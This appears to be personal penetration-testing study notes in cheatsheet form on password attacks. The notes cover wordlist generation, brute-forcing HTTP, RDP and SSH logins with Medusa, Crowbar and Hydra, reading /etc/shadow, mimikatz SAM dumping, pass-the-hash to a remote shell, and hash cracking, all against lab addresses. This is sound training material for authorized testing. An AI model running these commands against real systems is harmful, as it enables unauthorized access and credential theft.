---
id: activeinformationgathering
tags: [bash, cheatsheet]
created: 2023-01-26
---
# active-information-gathering

backlinks: [[snippets-bash]]

sources:

- <https://github.com/danielmiessler/SecLists>

- password attacks
  - wordlists or dictionary files are simply text files containing words to use as input
    - /usr/share/wordlists/
    - increase effectiveness of wordlists by adding words and phrases specific to our target
    - use cewl to get a word list from website
      - ```shell cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt```
    - use johntheripper (jtr) to generate custom wordlist based on cewl results
      - ```shell john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt```
  - brute force password attack calculates every possible combination until the correct one is found
    - to generate a brute force wordlist use crunch
      - placeholders
        - @ Lower case alpha characters
        - , Upper case alpha characters
        - % Numeric characters
        - ^ Special characters including space
      - min 8 characters and max 8 characters
      - ```shell crunch 8 8 -t ,@@^^%%%```
      - ```shell crunch 4 6 0123456789ABCDEF -o crunch.txt``` min 4 max 6 and only 0123456789ABCDEF
      - ```shell crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt```    predefined character sets located here /usr/share/crunch/charset.lst.
      - ```shell

$ crunch 1 4 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
Crunch will now generate the following amount of data: 37128728 bytes
35 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 7454980

crunch: 100% completed generating output
    ```

- common network service attack methods
  - the art behind network service password attacks is choosing appropriate targets, user lists, and password files carefully and intelligently before initiating the attack.
  - attacking RDP is slower than HTTP but usually yeilds better rewards
  - HTTP htaccess Attack with Medusa
    - unzip rockyou ```shell sudo gunzip /usr/share/wordlists/rockyou.txt.gz```
    - launch medusa and initiate the attack against the htaccess-protected URL (-m DIR:/admin) on our target host with -h 10.11.0.22. We will attack the admin user (-u admin) with passwords from our rockyou wordlist file (-P /usr/share/wordlists/rockyou.txt and will, of course, use an HTTP authentication scheme (-M)
    - ```shell medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin```
    - list all network protocols that can be attacked ```shell medusa -d```
    - smb attacks <http://foofus.net/goons/jmk/medusa/medusa-smbnt.html>
  - RDP Remote desktop protocol attack with Crowbar
    - ```shell sudo apt install crowbar```
    - To invoke crowbar, we will specify the protocol (-b), the target server (-s), a username (-u), a wordlist (-C), and the number of threads (-n)
    - ```shell crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1```
  - SSH Attack with THC-Hydra
    - SSH protocol on our local machine ssh://127.0.0.1, focus on the kali user (-l kali), and again use the rockyou wordlist (-P)
    - ```shell hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1```
    - standard protocols
      - ```shell hydra```
  - HTTP POST Attack with THC-Hydra
    - we should use the "http-form-post" service module. We can supply the service name followed by -U to obtain additional information about the required arguments:
      - ```shell hydra http-form-post -U```
      - The above form, part of the /form/login.html page, indicates that the POST request is handled by /form/frontpage.php, which is the URL we will feed to Hydra. The syntax displayed in Listing 20 requires the form parameters, which in this case are user and pass. Since we are attacking the admin user login with a wordlist, the combined argument to Hydra becomes /form/frontpage.php:user=admin&pass=^PASS^, with ^PASS^ acting as a placeh
      - 
      - older for our wordlist file entries. We must also provide the condition string to indicate when a login attempt is unsuccessful. This can be found by attempting a few manual login attempts. In our example, the web page returns the text "INVALID LOGIN" as shown in Figure 2:
      - ```shell http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN"```
      - we will supply the admin user name (-l admin) and wordlist (-P), request verbose output with -vV, and use -f to stop the attack when the first successful result is found. In addition, we will supply the service module name (http-form-post) and its required arguments ("/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN")
      - ```shell hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f```

- leveraging password hashses
  - Rather than storing passwords in clear text, modern authentication mechanisms usually store them as hashes to improve security.
  - This means that during the authentication process, the password presented by the user is hashed and compared with the previously stored message digest.
  - identify a hash using
    - ```shell hashid c43ee559d69bc7f691fe2fbfe8a5ef0a```   MD2, MD5, MD4, NTLM, etc
    - ```shell hashid '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand6ZsqQKAF3G0tHD9bd59e5NAz/s7DQcAojRTWNpZX0'```   SHA-512 Crypt
  - Linux
    - /etc/shadow![Alt text](kb/offsec/pen200/19-PasswordAttacks/image.png)
    - ```shell sudo grep root /etc/shadow```
    - split on ":"  root:$6$Rw99zZ2B$AZwfboPWM6z2tiBeK.EL74sivucCa8YhCrXGCBoVdeYUGsf8iwNxJkr.wTLDjI5poygaUcLaWtP/gewQkO7jT/:17564:0:99999:7:::
      - root username
      - $6$Rw99zZ2B$AZwfboPWM6z2tiBeK.EL74sivucCa8YhCrXGCBoVdeYUGsf8iwNxJkr.wTLDjI5poygaUcLaWtP/gewQkO7jT/
        - $id$salt$hashed
          - $6$ means SHA-512  [$1$ – MD5, $2$, $2a$, $2b$ – bcrypt, $5$ – SHA-256, $6$ – SHA-512, $y$ – yescrypt ]
          - Rw99zZ2B  = salt
          - AZwfboPWM6z2tiBeK.EL74sivucCa8YhCrXGCBoVdeYUGsf8iwNxJkr.wTLDjI5poygaUcLaWtP/gewQkO7jT/ = hash
          - Empty string – No password, the account has no password (reported by passwd on Solaris with "NP").[8]
          - "!", "*" – the account is password locked, user will be unable to log in via password authentication but other methods (e.g. ssh key, logging in as root) may be still allowed.
          - "*LK*" – the account itself is locked, user will be unable to log in.
          - "*NP*", "!!" – the password has never been set[9]
      - 17564 Days since epoch of last password change
      - 0 Days until change allowed
      - 99999 Days before change required
      - 7 Days warning for expiration
      - Days after no logins before account is locked
      - Days since epoch when account expires
      - Reserved and unused
    - windows
      - On Windows systems, hashed user passwords are stored in the Security Accounts Manager (SAM).8 To deter offline SAM database password attacks, Microsoft introduced the SYSKEY feature (Windows NT 4.0 SP3), which partially encrypts the SAM file
      - Windows NT-based operating systems, up to and including Windows 2003, store two different password hashes: LAN Manager (LM),9 which is based on DES,10 and NT LAN Manager (NTLM),11 which uses MD412 hashing. LAN Manager is known to be very weak since passwords longer than seven characters are split into two strings and each piece is hashed separately. Each password string is also converted to upper-case before being hashed and, moreover, the LM hashing system does not include salts, making a hash-lookup attack feasible.
      - Windows Vista on, the operating system disables LM by default and uses NTLM, which, among other things, is case sensitive, supports all Unicode characters, and does not split the hash into smaller, weaker parts. However, NTLM hashes stored in the SAM database are still not salted.
      - The SAM database cannot be copied while the operating system is running because the windows kernel keeps an exclusive lock on the file.
        - mimikatz can dump the in memory SAM hashes
      - mimikatz facilitates password hash extraction from the Local Security Authority Subsystem (LSASS) process memory where they are cached
        - from elevated cmd prompt
        - ```shell C:\Tools\password_attacks\mimikatz.exe```
        - ```shell mimikatz # privilege::debug```   enables the SeDebugPrivilge access right required to tamper with another process (if this fails mimikatz was probably run without privs)
        - ```shell mimikatz # token::elevate```   use the token::elevate command to elevate the security token from high integrity (administrator) to SYSTEM integrity because LSASS is a system process
        - ```shell mimikatz # lsadump::sam```     dump the contents of the same database        ![Alt text](kb/offsec/pen200/19-PasswordAttacks/image-1.png)
      - other hash dumping tools, including pwdump, fgdump,15 and Windows Credential Editor (wce)16 work well against older Windows operating systems like Windows XP and Windows Server 2003.
      - The Pass-the-Hash (PtH) technique (discovered in 1997) allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a clear text password. This is possible because NTLM/LM password hashes are not salted and remain static between sessions. Moreover, if we discover a password hash on one target, we cannot only use it to authenticate to that target, we can use it to authenticate to another target as well, as long as that target has an account with the same username and password.![Alt text](assets/attachments/kb/offsec/pen200/19-PasswordAttacks/notes/image-4.png)
        - we discovered a local administrative account that is enabled on multiple systems. We exploited a vulnerability on one of these systems and have gained SYSTEM privileges, allowing us to dump local LM and NTLM hashes. We have copied the local administrator NTLM hash and can now use it instead of a password to gain access to a different machine, which has the same local administrator acount and password.
        - <https://github.com/byt3bl33d3r/pth-toolkit>
        - we will invoke pth-winexe on our Kali machine to authenticate to our target using a password hash previously dumped. We will gain a remote command prompt on the target machine by specifying the user name and hash (-U) along with the SMB share (in UNC format) and the name of the command to execute, which in Listing 28 is cmd. We will ignore the DOMAIN parameter, and prepend the username (followed by a % sign) to the hash to complete the command.
        - on kali ```shell pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd```
        - For example, some applications like Internet Explorer and Windows Defender use the Web Proxy Auto-Discovery Protocol (WPAD)5 to detect proxy settings. If we are on the local network, we could poison these requests and force NetNTLM authentication with a tool like Responder.py,6 which creates a rogue WPAD server designed to exploit this security issue. Since poisoning is highly disruptive to other users, tools like Responder.py should never be used in the labs.
  - password cracking
    - use john the ripper
      - ```shell

kali@kali:~$ cat hash.txt
WDAGUtilityAccount:0c509cca8bcd12a26acf0d1e508cb028
Offsec:2892d26cdf84d7a70e2eb3b9f05c425e ```
      - ```shell sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT```
      - ```shell john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT``` apply mangling rules
    - In order to crack Linux-based hashes with JTR, we will need to first use the unshadow utility to combine the passwd and shadow files from the compromised system.
      - ```shell
kali@kali:~$ unshadow passwd-file.txt shadow-file.txt
victim:$6$fOS.xfbT$5c5vh3Zrk.88SbCWP1nrjgccgYvCC/x7SEcjSujtrvQfkO4pSWHaGxZojNy.vAqMGrBBNOb0P3pW1ybxm2OIT/:1003:1003:,,,:/home/victim:/bin/bash

kali@kali:~$ unshadow passwd-file.txt shadow-file.txt > unshadowed.txt

```

      - run john ```shell john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt```
      - get results ```shell └─# john --show --format=NT hash.txt                                                                                                                                                        
Offsec:lab

1 password hash cracked, 1 left
```

hashcat64.exe -b
